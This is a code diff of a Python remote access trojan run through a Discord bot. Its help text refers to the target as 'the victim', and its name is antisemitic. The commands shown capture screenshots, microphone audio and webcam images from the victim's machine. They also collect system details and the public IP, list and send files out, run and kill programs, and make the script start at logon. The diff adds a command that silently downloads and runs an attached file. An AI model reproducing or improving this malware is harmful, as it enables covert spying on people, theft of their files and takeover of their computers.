@@ -1,15 +1,16 @@
 from discord.ext import commands
+from PIL import Image, ImageDraw
 from threading import Thread
 from pynput import keyboard
 import subprocess
 import webbrowser
+import mss.tools
 import pyautogui
 import PyElevate
 import pyperclip
 import datetime
 import platform
 import requests
-import tempfile
 import asyncio
 import discord
 import hashlib
@@ -23,13 +24,14 @@ import time
 import uuid
 import wave
 import cv2
+import mss
 import sys
 import wmi
 import io
 import os
 import re
 
-TOKEN = "Bot token here" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
+TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -404,7 +406,7 @@ async def on_ready():
         channel_name = bot_channel()
         existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
         logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S")
-                    
+        
         if existing_channel is None:
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
@@ -419,6 +421,12 @@ async def on_ready():
         in_server_ammount += 1
             
     print(f'JewFuss-XT logged in as "{bot.user.name}" on {in_server_ammount} server(s)')
+    
+    try:
+        await bot.tree.sync()
+        print("synced bot commands")
+    except Exception as e:
+        print(f"Error syncing bot commands: {e}")
 
 @bot.event
 async def on_message(message):
@@ -428,15 +436,15 @@ async def on_message(message):
     if message.channel.name == channel_name:
         await bot.process_commands(message)
         
-@bot.command()
+@bot.command(help="Gets information on the victim's system")
 async def sysinfo(ctx):
-    windows_devicename = platform.node()
-    windows_version = platform.version()
-    windows_os_build = platform.win32_ver()[1]
-    windows_os_type = platform.win32_ver()[0]
-    timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
-    
     try:
+        windows_devicename = platform.node()
+        windows_version = platform.version()
+        windows_os_build = platform.win32_ver()[1]
+        windows_os_type = platform.win32_ver()[0]
+        timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
+        
         c = wmi.WMI()
         system = c.Win32_ComputerSystem()[0]
         bios = c.Win32_BIOS()[0]
@@ -444,12 +452,12 @@ async def sysinfo(ctx):
         network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
         physical_disk = c.Win32_DiskDrive()[0]
         
-        serial_number = bios.SerialNumber if hasattr(bios, 'SerialNumber') else "Unknown"
-        manufacturer = system.Manufacturer if hasattr(system, 'Manufacturer') else "Unknown"
-        model = system.Model if hasattr(system, 'Model') else "Unknown"
+        serial_number = getattr(bios, 'SerialNumber', "Unknown")
+        manufacturer = getattr(system, 'Manufacturer', "Unknown")
+        model = getattr(system, 'Model', "Unknown")
         total_ram = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else "Unknown"
         total_ram_gb = total_ram / 1024 if total_ram != "Unknown" else "Unknown"
-        cpu = processor.Name if hasattr(processor, 'Name') else "Unknown"
+        cpu = getattr(processor, 'Name', "Unknown")
         total_main_drive_storage = int(physical_disk.Size) // (1024**3) if hasattr(physical_disk, 'Size') else "Unknown"
         network_adapter = network_adapters[0].Description.split(" - ")[-1] if network_adapters else "Unknown"
         
@@ -458,21 +466,21 @@ async def sysinfo(ctx):
         if device_uuid.startswith("UUID"):
             device_uuid = device_uuid.replace("UUID", "").strip()
         
-        sku_number = system.IdentifyingNumber if hasattr(system, 'IdentifyingNumber') else "Unknown"
+        sku_number = getattr(system, 'IdentifyingNumber', "Unknown")
         ip = requests.get('https://api.ipify.org').content.decode('utf8')
     
     except Exception as e:
         await ctx.send(f"Error fetching system information: {e}")
         return
     
-    output = "```\n"
+    output = ""
     output += f"Windows Information:\n"
     output += f"Windows devicename: {windows_devicename}\n"
     output += f"Windows Version: {windows_version}\n"
     output += f"Windows OS Build: {windows_os_build}\n"
     output += f"Windows OS Type: {windows_os_type}\n"
     output += f"\nOther Information:\n"
-    output += f"Public IP: {format(ip)}\n"
+    output += f"Public IP: {ip}\n"
     output += f"Timezone: {timezone}\n"
     output += f"\nDevice Specifications:\n"
     output += f"Serial Number: {serial_number}\n"
@@ -484,14 +492,10 @@ async def sysinfo(ctx):
     output += f"Network adapter: {network_adapter}\n"
     output += f"Device UUID: {device_uuid}\n"
     output += f"SKU Number: {sku_number}\n"
-    output += "```"
     
     if len(output) > 2000:
-        with tempfile.NamedTemporaryFile(mode='w', delete=False, encoding='utf-8') as temp_file:
-            temp_file.write(output)
-            temp_file_name = temp_file.name
-        
-        await ctx.send(file=discord.File(temp_file_name))
+        buffer = io.BytesIO(output.encode('utf-8'))
+        await ctx.send(file=discord.File(fp=buffer, filename="system_info.txt"))
     else:
         await ctx.send(output)
 
@@ -620,40 +624,29 @@ async def set_clipboard(ctx, *, text: str):
 
 @bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).")
 async def ss(ctx, display_index: int = 0):
-    import mss
-    import mss.tools
-    import pyautogui
-    from PIL import Image, ImageDraw
-    import tempfile
+    try:
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            if display_index < 0 or display_index >= len(monitors):
+                available = ", ".join(str(i) for i in range(len(monitors)))
+                await ctx.send(f"Invalid display index provided. Available displays: {available}")
+                return
 
-    with mss.mss() as sct:
-        # sct.monitors[0] is the full desktop; [1:] are individual monitors.
-        monitors = sct.monitors
-        if display_index < 0 or display_index >= len(monitors):
-            available = ", ".join(str(i) for i in range(len(monitors)))
-            await ctx.send(f"Invalid display index provided. Available displays: {available}")
-            return
-
-        monitor = monitors[display_index]
-        sct_img = sct.grab(monitor)
-        # Convert the mss screenshot to a PIL image
-        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-
-        # Get the global cursor position
-        cursor = pyautogui.position()
-        # Adjust the cursor position relative to the monitor's top-left
-        relative_cursor = (cursor[0] - monitor["left"], cursor[1] - monitor["top"])
-
-        # Draw a red dot at the cursor position
-        draw = ImageDraw.Draw(img)
-        x, y = relative_cursor
-        draw.ellipse((x-5, y-5, x+5, y+5), fill=(255, 0, 0))
-
-        # Save to a temporary file and send
-        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
-            img.save(temp_file, 'PNG')
-            await ctx.send("Command Executed! (Red dot indicates cursor)", 
-                           file=discord.File(temp_file.name, filename="screenshot.png"))
+            monitor = monitors[display_index]
+            sct_img = sct.grab(monitor)
+            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+            cursor = pyautogui.position()
+            relative_cursor = (cursor[0] - monitor["left"], cursor[1] - monitor["top"])
+            draw = ImageDraw.Draw(img)
+            x, y = relative_cursor
+            draw.ellipse((x-5, y-5, x+5, y+5), fill=(255, 0, 0))
+            
+            buffer = io.BytesIO()
+            img.save(buffer, format='PNG')
+            buffer.seek(0)
+            await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(fp=buffer, filename="screenshot.png"))
+    except Exception as e:
+        await ctx.send(f"Error executing screenshot command: {str(e)}")
         
 @bot.command(name="tts", help="Run TTS on victim's system")
 async def tts(ctx, *, text: str):
@@ -682,7 +675,6 @@ async def ttsurl(ctx, url: str):
         response = requests.get(url)
         text = response.text
 
-        # Run the TTS process in a subprocess
         tts_process = subprocess.Popen(
             ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
             creationflags=subprocess.CREATE_NO_WINDOW
@@ -708,44 +700,36 @@ async def stoptts(ctx):
 
 @bot.command(help="Records audio from the victim's microphone for 10 seconds.")
 async def listen(ctx):
+    loop = asyncio.get_event_loop()
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 2
+    RATE = 44100
+    RECORD_SECONDS = 10
+
     def recording_thread():
-        CHUNK = 1024
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 2
-        RATE = 44100
-        RECORD_SECONDS = 10
-
         p = pyaudio.PyAudio()
-
-        stream = p.open(format=FORMAT,
-                        channels=CHANNELS,
-                        rate=RATE,
-                        input=True,
-                        frames_per_buffer=CHUNK)
-
+        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
         frames = []
-
         for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
             data = stream.read(CHUNK)
             frames.append(data)
-
         stream.stop_stream()
         stream.close()
         p.terminate()
 
-        with io.BytesIO() as buf:
-            wf = wave.open(buf, 'wb')
-            wf.setnchannels(CHANNELS)
-            wf.setsampwidth(p.get_sample_size(FORMAT))
-            wf.setframerate(RATE)
-            wf.writeframes(b''.join(frames))
-            wf.close()
+        buffer = io.BytesIO()
+        wf = wave.open(buffer, 'wb')
+        wf.setnchannels(CHANNELS)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(RATE)
+        wf.writeframes(b''.join(frames))
+        wf.close()
+        buffer.seek(0)
+        loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buffer))
 
-            buf.seek(0)
-            bot.loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buf))
-
-    def send_response(ctx, buf):
-        return ctx.send("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))
+    async def send_response(ctx, buf):
+        await ctx.send("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))
 
     thread = Thread(target=recording_thread)
     thread.start()
@@ -773,9 +757,9 @@ async def upload(ctx, folder: str = None):
     else:
         await ctx.send("Error: No file attached to the message.")
 
-@bot.command(help="Lists contents of a folder on victim's system, format $ls {folder (D:/folder/)}")
+@bot.command(help="Lists contents of a folder on the system, format $ls {folder (D:/folder/)}")
 async def ls(ctx, path: str = None):
-    try:
+    try: 
         if not path:
             await ctx.send("Error: No path provided. Please specify a directory path to list.")
             return
@@ -785,11 +769,13 @@ async def ls(ctx, path: str = None):
         if not os.path.isdir(path):
             await ctx.send(f"Error: The path '{path}' is not a directory.")
             return
+
         items = os.listdir(path)
         parent_dir = os.path.abspath(os.path.join(path, os.pardir))
         dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
         files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
         response = f"Parent Directory: {parent_dir}\n\n"
+        
         if dirs or files:
             for directory in dirs:
                 dir_full_path = os.path.join(path, directory)
@@ -799,18 +785,42 @@ async def ls(ctx, path: str = None):
                 response += f"[FILE] {file_full_path}\n"
         else:
             response += "This directory is empty.\n"
-
-        if len(response) > 2000:
-            file_path = "directory_listing.txt"
-            with open(file_path, "w") as file:
-                file.write(response)
-            await ctx.send(file=discord.File(file_path))
-            os.remove(file_path)
-        else:
-            await ctx.send(response)
+        
+        buffer = io.BytesIO(response.encode('utf-8'))
+        await ctx.send(file=discord.File(fp=buffer, filename="directory_listing.txt"))
     except Exception as e:
         await ctx.send(f"Error: Could not list the directory contents. {str(e)}")
 
+@bot.command(help="Downloads attached file and runs it on the victim's device.")
+async def downloadandrun(ctx):
+    if not ctx.message.attachments:
+        await ctx.send("Error: No file attached. Please attach a file to download and run.")
+        return
+
+    attachment = ctx.message.attachments[0]
+
+    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
+    if not os.path.exists(downloads_folder):
+        os.makedirs(downloads_folder, exist_ok=True)
+
+    file_path = os.path.join(downloads_folder, attachment.filename)
+    try:
+        file_bytes = await attachment.read()
+        with open(file_path, "wb") as f:
+            f.write(file_bytes)
+    except Exception as e:
+        await ctx.send(f"Error downloading file: {e}")
+        return
+
+    try:
+        process = subprocess.Popen(f'cmd /c start "" /wait "{file_path}" && del /f /q "{file_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        await asyncio.to_thread(process.wait)
+        await ctx.send("File executed and deleted after finishing.")
+        
+    except Exception as e:
+        await ctx.send(f"Error executing file: {e}")
+        if os.path.exists(file_path):
+            os.remove(file_path)
 
 @bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
 async def run(ctx, file_path: str = None):
@@ -828,29 +838,20 @@ async def run(ctx, file_path: str = None):
 
 @bot.command(help="Compresses and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
 async def download(ctx, file_path: str = None):
-    if not file_path:
-        await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
-        return
-    if not os.path.exists(file_path):
-        await ctx.send(f"Error: The path '{file_path}' does not exist.")
-        return
-    
     try:
+        if not file_path:
+            await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
+            return
+        if not os.path.exists(file_path):
+            await ctx.send(f"Error: The path '{file_path}' does not exist.")
+            return
+        
         tar_filename = os.path.basename(file_path) + '.tar.gz'
-        tar_path = os.path.join(os.path.dirname(file_path), tar_filename)
-        
-        with tarfile.open(tar_path, "w:gz") as tar:
-            if os.path.isfile(file_path):
-                tar.add(file_path, arcname=os.path.basename(file_path))
-            elif os.path.isdir(file_path):
-                tar.add(file_path, arcname=os.path.basename(file_path))
-            else:
-                await ctx.send(f"Error: The path '{file_path}' is neither a file nor a folder.")
-                return
-        
-        await ctx.send(file=discord.File(tar_path))
-        os.remove(tar_path)
-        
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
+            tar.add(file_path, arcname=os.path.basename(file_path))
+        buffer.seek(0)
+        await ctx.send(file=discord.File(fp=buffer, filename=tar_filename))
     except Exception as e:
         await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
     
@@ -923,30 +924,32 @@ async def webcampic(ctx, cam: int = 0):
         
         ret, frame = cap.read()
         cap.release()
-        
         if not ret:
             raise Exception("Failed to grab frame from webcam")
         
-        with io.BytesIO() as buf:
-            im_encoded = cv2.imencode(".png", frame)[1]
-            buf.write(im_encoded.tobytes())
-            buf.seek(0)
-            await ctx.send(f"Captured from camera {cam}!", file=discord.File(fp=buf, filename="webcam.png"))
-            
+        buffer = io.BytesIO()
+        ret, im_encoded = cv2.imencode(".png", frame)
+        if not ret:
+            raise Exception("Failed to encode image")
+        buffer.write(im_encoded.tobytes())
+        buffer.seek(0)
+        await ctx.send(f"Captured from camera {cam}!", file=discord.File(fp=buffer, filename="webcam.png"))
     except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")
+        await ctx.send(f"Error executing webcam capture command: {str(e)}")
 
 @bot.command(help="Lists all running tasks on the victim's system.")
 async def tasks(ctx):
-    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
-    
-    with io.StringIO() as buf:
+    import psutil, io
+    try:
+        processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
+        text = ""
         for proc in processes:
-            buf.write(f"PID: {proc['pid']} - Name: {proc['name']}\n")
-        
-        buf.seek(0)
-        
-        await ctx.send("List of running tasks:", file=discord.File(fp=buf, filename="tasks.txt"))
+            text += f"PID: {proc['pid']} - Name: {proc['name']}\n"
+        buffer = io.BytesIO(text.encode('utf-8'))
+        await ctx.send("List of running tasks:", file=discord.File(fp=buffer, filename="tasks.txt"))
+    except Exception as e:
+        await ctx.send(f"Error: Could not list tasks. {str(e)}")
+
 
 @bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
 async def kill(ctx, arg: str = ""):
@@ -1105,19 +1108,8 @@ async def hidescript(ctx):
 @bot.command(help="Makes this script execute on logon (only user that ran this file, startup programs dont start if hidden, hence the now seperate command).")
 async def startup(ctx):
     try:
-        ## Modify registry to show hidden files and folders
-        #reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
-        #winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
-        #winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
-        #winreg.CloseKey(reg_key)
+        script_path = sys.argv[0]
         
-        # Determine script path
-        if os.path.basename(sys.executable).lower() == "python.exe":
-            script_path = __file__  # Use __file__ if running from Python interpreter
-        else:
-            script_path = sys.executable  # Use sys.executable if running from compiled executable
-        
-        # Copy script to startup folder
         startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
     
         if not os.path.exists(startup_folder):
@@ -1131,19 +1123,13 @@ async def startup(ctx):
         print(f"Script '{script_name}' moved to the startup folder.")
         await ctx.send(f"Moved '{script_name}' to the startup folder.")
         
-        # Make the copied script hidden
-        #os.system(f'attrib +h "{destination_path}"')
-        
-        # Prepare the command to start the script from the startup folder without console window
         if script_path.endswith('.py') or script_path.endswith('.pyw'):
             startup_command = f'cmd /C start /MIN pythonw "{destination_path}" & del "{script_path}"'
         else:
             startup_command = f'start /MIN "" "{destination_path}" & del "{script_path}"'
         
-        # Start the script from the startup folder without waiting for it to finish
         subprocess.Popen(startup_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         
-        # Notify and exit gracefully
         await ctx.send("Script started on startup successfully.")
         sys.exit()
 
